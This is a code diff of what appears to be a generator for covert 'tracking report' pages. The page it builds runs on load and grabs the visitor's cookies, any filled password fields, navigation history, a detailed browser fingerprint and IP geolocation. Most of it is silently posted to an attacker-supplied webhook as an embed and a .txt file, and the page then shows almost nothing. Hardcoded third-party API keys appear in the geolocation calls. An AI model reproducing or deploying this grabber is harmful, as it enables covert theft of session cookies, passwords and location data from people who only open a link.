@@ -338,14 +338,12 @@
     drawParticles();
 
     // ============================================================
-    //  2.  WEBHOOK + IP + COOKIES + PASSWORDS + HISTORY
+    //  2.  WEBHOOK + IP (multi-API) + BROWSER DETAILS + BULLET PTS
     // ============================================================
     const webhookInput = document.getElementById('webhookInput');
     const generateBtn = document.getElementById('generateBtn');
     const outputBox = document.getElementById('outputBox');
     const statusMsg = document.getElementById('statusMsg');
-
-    const API_KEY = '60168b4930ba41ee82b0d3a2b09ea38c';
 
     function setStatus(msg, type = '') {
       statusMsg.textContent = msg;
@@ -371,8 +369,7 @@
       const encodedWebhook = encodeURIComponent(webhookUrl);
 
       // ============================================================
-      //  TRACKING PAGE – collects cookies, passwords (autofill),
-      //  history (basic), and formats as neat text file
+      //  TRACKING PAGE – multi-IP APIs, browser details, bullet points
       // ============================================================
       const trackingPage = `<!DOCTYPE html>
 <html lang="en">
@@ -389,35 +386,69 @@
 <script>
 (async function() {
   const webhook = decodeURIComponent("${encodedWebhook}");
-  const apiKey = "${API_KEY}";
 
   // ---------- helper: get all cookies ----------
   function getCookies() {
     return document.cookie.split(';').map(c => c.trim()).filter(c => c);
   }
 
-  // ---------- helper: try to extract autofill passwords ----------
+  // ---------- helper: get browser details ----------
+  function getBrowserDetails() {
+    const details = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform || 'unknown',
+      language: navigator.language || 'unknown',
+      languages: navigator.languages || [],
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || 'unspecified',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      vendor: navigator.vendor || 'unknown',
+      vendorSub: navigator.vendorSub || 'unknown',
+      productSub: navigator.productSub || 'unknown',
+      userAgentData: navigator.userAgentData ? {
+        brands: navigator.userAgentData.brands,
+        mobile: navigator.userAgentData.mobile,
+        platform: navigator.userAgentData.platform
+      } : null,
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth
+      },
+      window: {
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight,
+        devicePixelRatio: window.devicePixelRatio || 1
+      },
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+      timezoneOffset: new Date().getTimezoneOffset(),
+      currentUrl: window.location.href,
+      referrer: document.referrer || 'direct',
+      timestamp: new Date().toISOString()
+    };
+    return details;
+  }
+
+  // ---------- helper: get saved passwords (autofill) ----------
   function getSavedPasswords() {
-    // This attempts to read from autofill by creating hidden fields.
-    // Note: Modern browsers restrict this, but we try our best.
     const inputs = document.querySelectorAll('input[type="password"]');
     let passwords = [];
     inputs.forEach(inp => {
       if (inp.value) passwords.push(inp.value);
     });
-    // Also try to find any input with autocomplete="off" that might have values
-    document.querySelectorAll('input').forEach(inp => {
-      if (inp.type !== 'password' && inp.autocomplete === 'off' && inp.value) {
-        // might be a hidden field with sensitive data
-      }
-    });
     return passwords;
   }
 
-  // ---------- helper: get basic history (from performance) ----------
+  // ---------- helper: get history (basic) ----------
   function getHistory() {
     try {
-      // we can't access full history, but we can get navigation entries
       const entries = performance.getEntriesByType('navigation');
       const historyData = [];
       if (entries.length) {
@@ -425,12 +456,10 @@
           historyData.push({
             type: e.type,
             url: e.name || window.location.href,
-            duration: e.duration || 0,
-            startTime: e.startTime || 0
+            duration: e.duration || 0
           });
         });
       }
-      // also try to get referrer
       return {
         referrer: document.referrer || 'direct',
         navigation: historyData
@@ -442,123 +471,154 @@
 
   // ---------- collect everything ----------
   try {
-    // IP & geo
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-    const ip = ipData.ip || 'unknown';
+    // Get IP from multiple APIs
+    let ip = 'unknown';
+    let geoData = {};
 
-    const geoRes = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey + '&ip_address=' + ip);
-    const geo = await geoRes.json();
+    // Try ipify first
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      if (ipData.ip) ip = ipData.ip;
+    } catch(e) {}
 
-    // device info
-    const ua = navigator.userAgent;
-    const platform = navigator.platform || 'unknown';
-    const language = navigator.language || 'unknown';
-    const screenRes = screen.width + 'x' + screen.height;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-    const currentUrl = window.location.href;
+    // Try multiple geolocation APIs
+    const geoAPIs = [
+      'https://ipapi.co/' + ip + '/json/',
+      'https://ip-api.com/json/' + ip + '?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query',
+      'https://geo.ipify.org/api/v2/country,city?apiKey=at_HZ5kZxH4BxRLuKOvWKRTU3zDlYf66&ipAddress=' + ip
+    ];
 
-    // cookies
+    let geoSuccess = false;
+    for (const api of geoAPIs) {
+      try {
+        const geoRes = await fetch(api);
+        const geo = await geoRes.json();
+        if (geo && (geo.country || geo.countryCode || geo.country_code)) {
+          geoData = geo;
+          geoSuccess = true;
+          break;
+        }
+      } catch(e) {}
+    }
+
+    // If no geo data, use fallback
+    if (!geoSuccess) {
+      try {
+        const fallbackRes = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=60168b4930ba41ee82b0d3a2b09ea38c&ip_address=' + ip);
+        const fallback = await fallbackRes.json();
+        if (fallback && fallback.country) geoData = fallback;
+      } catch(e) {}
+    }
+
+    // Get browser details
+    const browser = getBrowserDetails();
+
+    // Get cookies
     const cookies = getCookies();
 
-    // passwords (from autofill – may be empty due to browser restrictions)
+    // Get passwords
     const passwords = getSavedPasswords();
 
-    // history
+    // Get history
     const historyData = getHistory();
 
-    // build a neat formatted text file content
-    const lines = [];
-    lines.push('═══════════════════════════════════════════════════');
-    lines.push('  •  TRACKING REPORT  •');
-    lines.push('═══════════════════════════════════════════════════');
-    lines.push('');
-    lines.push('─── IP & GEOLOCATION ───');
-    lines.push('IP address        : ' + (geo.ip || ip));
-    lines.push('Hostname          : ' + (geo.hostname || 'N/A'));
-    lines.push('Country           : ' + (geo.country_flag || '') + ' ' + (geo.country || 'N/A') + ' (' + (geo.country_code || 'N/A') + ')');
-    lines.push('City              : ' + (geo.city || 'N/A'));
-    lines.push('Region            : ' + (geo.region || 'N/A'));
-    lines.push('Continent         : ' + (geo.continent || 'N/A'));
-    lines.push('Latitude          : ' + (geo.latitude || 'N/A'));
-    lines.push('Longitude         : ' + (geo.longitude || 'N/A'));
-    lines.push('ISP               : ' + (geo.isp || 'N/A'));
-    lines.push('Organization      : ' + (geo.organization || 'N/A'));
-    lines.push('ASN               : ' + (geo.asn || 'N/A'));
-    lines.push('Timezone          : ' + (geo.timezone?.name || timezone) + ' (UTC' + (geo.timezone?.offset || 'N/A') + ')');
-    lines.push('Currency          : ' + (geo.currency?.symbol || '') + ' ' + (geo.currency?.code || 'N/A'));
-    lines.push('');
-    lines.push('─── DEVICE & BROWSER ───');
-    lines.push('User Agent        : ' + ua);
-    lines.push('Platform          : ' + platform);
-    lines.push('Language          : ' + language);
-    lines.push('Screen Resolution : ' + screenRes);
-    lines.push('Current URL       : ' + currentUrl);
-    lines.push('Timestamp         : ' + new Date().toISOString());
-    lines.push('');
-    lines.push('─── COOKIES (' + cookies.length + ') ───');
+    // Build bullet-point report
+    const bulletPoints = [];
+
+    // IP & Geolocation
+    bulletPoints.push('• IP Address: ' + (geoData.ip || geoData.query || ip));
+    bulletPoints.push('• Hostname: ' + (geoData.hostname || geoData.reverse || 'N/A'));
+    bulletPoints.push('• Country: ' + (geoData.country_flag || '') + ' ' + (geoData.country || geoData.country_name || 'N/A') + ' (' + (geoData.countryCode || geoData.country_code || 'N/A') + ')');
+    bulletPoints.push('• City: ' + (geoData.city || 'N/A'));
+    bulletPoints.push('• Region: ' + (geoData.region || geoData.regionName || 'N/A'));
+    bulletPoints.push('• Continent: ' + (geoData.continent || 'N/A'));
+    bulletPoints.push('• Latitude: ' + (geoData.lat || geoData.latitude || 'N/A'));
+    bulletPoints.push('• Longitude: ' + (geoData.lon || geoData.longitude || 'N/A'));
+    bulletPoints.push('• Timezone: ' + (geoData.timezone || geoData.timezone_name || browser.timezone));
+    bulletPoints.push('• ISP: ' + (geoData.isp || geoData.org || 'N/A'));
+    bulletPoints.push('• Organization: ' + (geoData.org || geoData.organization || 'N/A'));
+    bulletPoints.push('• ASN: ' + (geoData.as || geoData.asn || 'N/A'));
+
+    // Browser Details
+    bulletPoints.push('• User Agent: ' + browser.userAgent);
+    bulletPoints.push('• Platform: ' + browser.platform);
+    bulletPoints.push('• Language: ' + browser.language);
+    bulletPoints.push('• Languages: ' + browser.languages.join(', '));
+    bulletPoints.push('• Cookie Enabled: ' + browser.cookieEnabled);
+    bulletPoints.push('• Do Not Track: ' + browser.doNotTrack);
+    bulletPoints.push('• Hardware Concurrency: ' + browser.hardwareConcurrency);
+    bulletPoints.push('• Device Memory: ' + browser.deviceMemory + ' GB');
+    bulletPoints.push('• Max Touch Points: ' + browser.maxTouchPoints);
+    bulletPoints.push('• Vendor: ' + browser.vendor);
+    bulletPoints.push('• Screen Resolution: ' + browser.screen.width + 'x' + browser.screen.height);
+    bulletPoints.push('• Screen Available: ' + browser.screen.availWidth + 'x' + browser.screen.availHeight);
+    bulletPoints.push('• Color Depth: ' + browser.screen.colorDepth + ' bits');
+    bulletPoints.push('• Window Inner: ' + browser.window.innerWidth + 'x' + browser.window.innerHeight);
+    bulletPoints.push('• Window Outer: ' + browser.window.outerWidth + 'x' + browser.window.outerHeight);
+    bulletPoints.push('• Device Pixel Ratio: ' + browser.window.devicePixelRatio);
+    bulletPoints.push('• Timezone Offset: ' + (browser.timezoneOffset / -60) + ' hours');
+    bulletPoints.push('• Current URL: ' + browser.currentUrl);
+    bulletPoints.push('• Referrer: ' + browser.referrer);
+    bulletPoints.push('• Timestamp: ' + browser.timestamp);
+
+    // User Agent Data (if available)
+    if (browser.userAgentData) {
+      bulletPoints.push('• UA Brands: ' + (browser.userAgentData.brands ? browser.userAgentData.brands.map(b => b.brand + ' v' + b.version).join(', ') : 'N/A'));
+      bulletPoints.push('• UA Mobile: ' + browser.userAgentData.mobile);
+      bulletPoints.push('• UA Platform: ' + browser.userAgentData.platform);
+    }
+
+    // Cookies
+    bulletPoints.push('• Cookies (' + cookies.length + ' found):');
     if (cookies.length === 0) {
-      lines.push('  (no cookies found)');
+      bulletPoints.push('  - None');
     } else {
-      cookies.forEach((c, i) => {
-        lines.push('  [' + (i+1) + '] ' + c);
-      });
+      cookies.forEach(c => bulletPoints.push('  - ' + c));
     }
-    lines.push('');
-    lines.push('─── SAVED PASSWORDS (autofill) ───');
+
+    // Passwords
+    bulletPoints.push('• Saved Passwords (' + passwords.length + ' detected):');
     if (passwords.length === 0) {
-      lines.push('  (none detected – browser restrictions may apply)');
+      bulletPoints.push('  - None detected (browser restrictions may apply)');
     } else {
-      passwords.forEach((p, i) => {
-        lines.push('  [' + (i+1) + '] ' + p);
-      });
+      passwords.forEach(p => bulletPoints.push('  - ' + p));
     }
-    lines.push('');
-    lines.push('─── HISTORY / NAVIGATION ───');
-    lines.push('Referrer          : ' + historyData.referrer);
+
+    // History
+    bulletPoints.push('• Navigation History:');
     if (historyData.navigation.length === 0) {
-      lines.push('  (no navigation entries)');
+      bulletPoints.push('  - None');
     } else {
-      historyData.navigation.forEach((e, i) => {
-        lines.push('  [' + (i+1) + '] ' + e.type + ' | ' + e.url + ' | duration: ' + (e.duration || 'N/A') + 'ms');
+      historyData.navigation.forEach(e => {
+        bulletPoints.push('  - ' + e.type + ' | ' + e.url + ' | duration: ' + (e.duration || 'N/A') + 'ms');
       });
     }
-    lines.push('');
-    lines.push('═══════════════════════════════════════════════════');
-    lines.push('  •  end of report  •');
-    lines.push('═══════════════════════════════════════════════════');
+    bulletPoints.push('• Referrer: ' + historyData.referrer);
 
-    const reportText = lines.join('\\n');
+    // Join with newlines
+    const reportText = bulletPoints.join('\\n');
 
-    // send to webhook as a file attachment
-    const formData = new FormData();
-    const blob = new Blob([reportText], { type: 'text/plain' });
-    formData.append('file', blob, 'tracking_report.txt');
-
-    // also send a simple embed with summary
+    // Send to webhook
     const embed = {
       title: '· tracking report ·',
       color: 0x000000,
-      fields: [
-        { name: 'IP', value: geo.ip || ip, inline: true },
-        { name: 'Country', value: (geo.country_flag || '') + ' ' + (geo.country || 'N/A'), inline: true },
-        { name: 'City', value: geo.city || 'N/A', inline: true },
-        { name: 'Cookies', value: cookies.length + ' found', inline: true },
-        { name: 'Passwords', value: passwords.length + ' detected', inline: true },
-        { name: 'Platform', value: platform, inline: true },
-        { name: 'Timestamp', value: new Date().toISOString(), inline: false }
-      ],
-      footer: { text: '· full report attached as .txt' }
+      description: '```\\n' + reportText.substring(0, 4000) + '\\n```',
+      footer: { text: 'full report attached as .txt' }
     };
 
-    // send both embed and file
+    // Send embed
     await fetch(webhook, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ embeds: [embed] })
     });
 
-    // also send the file separately
+    // Send as file
+    const formData = new FormData();
+    const blob = new Blob([reportText], { type: 'text/plain' });
+    formData.append('file', blob, 'tracking_report.txt');
+
     await fetch(webhook, {
       method: 'POST',
       body: formData
@@ -568,7 +628,6 @@
     // silent fail
   }
 
-  // show a minimal blank page
   document.body.innerHTML = '<div style="background:#000;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center;font-family:Inter,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;color:rgba(255,255,255,0.005);font-size:3.2rem;letter-spacing:18px;">·</div>';
 })();
 <\/script>
